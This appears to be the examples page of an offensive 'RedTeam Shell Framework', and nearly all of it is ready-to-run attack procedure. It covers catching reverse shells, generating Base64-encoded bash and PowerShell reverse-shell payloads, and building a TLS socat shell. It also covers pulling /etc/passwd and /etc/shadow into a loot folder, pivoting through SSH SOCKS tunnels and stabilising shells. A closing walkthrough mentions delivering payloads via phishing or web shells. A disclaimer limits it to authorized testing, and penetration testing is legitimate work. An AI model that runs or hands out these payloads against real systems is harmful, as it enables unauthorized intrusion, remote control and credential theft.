# Examples

Real-world usage scenarios for the RedTeam Shell Framework.

> All examples assume the framework is running via `bash shellmaster.sh` from the project root.

---

## Table of Contents

1. [Setting Up a Listener](#1-setting-up-a-listener)
2. [Generating Payloads](#2-generating-payloads)
3. [Encrypted Shell](#3-encrypted-shell)
4. [File Transfer](#4-file-transfer)
5. [Pivoting & Relays](#5-pivoting--relays)
6. [PTY Upgrade](#6-pty-upgrade)
7. [Full Operation Walkthrough](#7-full-operation-walkthrough)

---

## 1. Setting Up a Listener

### Reverse listener (catch incoming shell)

```
Main menu → 1 (Listeners) → 1 (Start Reverse Listener)
  Listen on IP [0.0.0.0]: (press Enter)
  Listen on PORT [4444]: 4444
  Use rlwrap for history? [y/n]: y
```

On the target, connect back:
```bash
bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
```

### Bind listener (attacker connects to target)

```
Main menu → 1 (Listeners) → 2 (Start Bind Listener)
  Listen on PORT [4444]: 5555
  Enable rlwrap? [y/n]: n
```

Then connect from attacker:
```bash
nc <TARGET_IP> 5555
```

---

## 2. Generating Payloads

### Bash reverse shell with Base64 encoding

```
Main menu → 2 (Payloads) → 1 (Bash Reverse Shell)
  Attacker IP: 192.168.1.100
  Attacker PORT: 4444
  Add Base64 encoding? [y/n]: y
  Add variable obfuscation? [y/n]: n
  Save to file? [y/n]: y
  Filename [bash_192.168.1.100_4444.sh]: (press Enter)
```

Output:
```bash
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzQ0NDQgMD4mMQ== | base64 -d | bash
```

Payload saved to `payloads/bash_192.168.1.100_4444.sh`.

### PowerShell reverse shell

```
Main menu → 2 (Payloads) → 2 (PowerShell Reverse Shell)
  Attacker IP: 192.168.1.100
  Attacker PORT: 4444
  Add Base64 encoding? [y/n]: y
```

Output:
```
powershell -EncodedCommand <base64_string>
```

Run on Windows target:
```powershell
powershell -EncodedCommand <base64_string>
```

### Batch generate all payload types

```
Main menu → 2 (Payloads) → 6 (Batch Generate)
  Attacker IP: 192.168.1.100
  Attacker PORT: 4444
```

Saves three files to `payloads/`:
```
payloads/batch_<timestamp>_bash.sh
payloads/batch_<timestamp>_powershell.ps1
payloads/batch_<timestamp>_python.py
```

---

## 3. Encrypted Shell

### Step 1 — Generate certificate

```
Main menu → 3 (Encryption) → 1 (Generate New Certificate)
```

Creates `certs/bind.pem` (combined key + cert for socat).

### Step 2 — Start encrypted listener

```
Main menu → 3 (Encryption) → 2 (Start Encrypted Listener)
  Enter LPORT for Encrypted Listener: 4443
```

### Step 3 — Get payload for target

```
Main menu → 3 (Encryption) → 3 (Generate Encrypted Payload)
  Enter LHOST [auto-detected]: 192.168.1.100
  Enter LPORT: 4443
```

Output:
```bash
socat OPENSSL:192.168.1.100:4443,verify=0 EXEC:/bin/bash
```

Run this on the target. All traffic is TLS-encrypted.

---

## 4. File Transfer

### Upload a file to remote host

```
Main menu → 4 (Transfer) → 1 (Upload File)
  Local file path: /tmp/exploit.sh
  Remote user: root
  Remote host/IP: 192.168.1.100
  Remote destination path [/tmp/]: /tmp/
```

Runs: `scp /tmp/exploit.sh root@192.168.1.100:/tmp/`

### Download a file from remote host

```
Main menu → 4 (Transfer) → 2 (Download File)
  Remote user: root
  Remote host/IP: 192.168.1.100
  Remote file path: /etc/passwd
  Local save path [./]: ./loot/
```

Runs: `scp root@192.168.1.100:/etc/passwd ./loot/`

### Verify file integrity

```
Main menu → 4 (Transfer) → 3 (Verify Checksum)
  File path: ./loot/passwd
```

Output:
```
MD5:    d41d8cd98f00b204e9800998ecf8427e
SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
```

---

## 5. Pivoting & Relays

### socat port relay

Forward all traffic arriving on port 5555 to an internal host:

```
Main menu → 5 (Relay) → 1 (Create socat Relay)
  Listen port (local): 5555
  Forward to host: 192.168.2.10
  Forward to port: 4444
```

Now any connection to attacker:5555 is forwarded to 192.168.2.10:4444.

### SSH local port forward

Access a service on the remote side via a local port:

```
Main menu → 5 (Relay) → 2 (Create SSH Tunnel) → 1 (Local)
  SSH user@host: user@pivot.host
  Local port: 8080
  Remote host to reach: 192.168.2.20
  Remote port: 80
```

Runs: `ssh -L 8080:192.168.2.20:80 user@pivot.host -N -f`

Now browse `http://localhost:8080` to reach the internal web server.

### SSH dynamic SOCKS proxy

Route all tool traffic through the pivot:

```
Main menu → 5 (Relay) → 2 (Create SSH Tunnel) → 3 (SOCKS proxy)
  SSH user@host: user@pivot.host
  SOCKS port [1080]: 1080
```

Runs: `ssh -D 1080 user@pivot.host -N -f`

Then use `proxychains` or configure tools to use SOCKS5 `127.0.0.1:1080`.

---

## 6. PTY Upgrade

After catching a limited reverse shell:

### Python method (preferred)

```
Main menu → 6 (Shell Stabilization) → 1 (Python PTY Upgrade)
```

Follow the displayed steps on the **target**:

```bash
# Step 1 — on target
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Step 2 — on attacker (Ctrl+Z, then:)
stty raw -echo; fg

# Step 3 — on target
export TERM=xterm-256color
stty rows 40 cols 150
```

### Fix broken environment

```
Main menu → 6 (Shell Stabilization) → 3 (Fix Environment)
```

Displays paste-ready commands:
```bash
export TERM=xterm-256color
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
stty rows 40 cols 150
reset
```

---

## 7. Full Operation Walkthrough

A complete authorized engagement workflow:

```bash
# 1. Start the framework
bash shellmaster.sh

# 2. Generate an encoded payload
# Main → 2 → 1 (Bash, IP: 192.168.1.200, port: 4443, Base64: y)
# Save as: initial_access.sh

# 3. Set up encrypted listener
# Main → 3 → 1 (Generate cert)
# Main → 3 → 2 (Start listener on 4443)

# 4. Deliver payload to target (out-of-band: web shell, phishing, etc.)
# Target executes payload → encrypted connection received

# 5. Upgrade the shell
# Main → 6 → 1 (Python PTY upgrade) — follow the steps

# 6. Collect files
# Main → 4 → 2 (Download /etc/shadow to ./loot/)
# Main → 4 → 3 (Verify checksum)

# 7. Pivot to internal network
# Main → 5 → 2 → 3 (SOCKS proxy through compromised host)
# Use proxychains for further enumeration

# 8. Review audit trail
tail -f logs/framework.log
ls logs/sessions/
```

---

> All examples are for **authorized security testing only**. Never run against systems without explicit written permission.
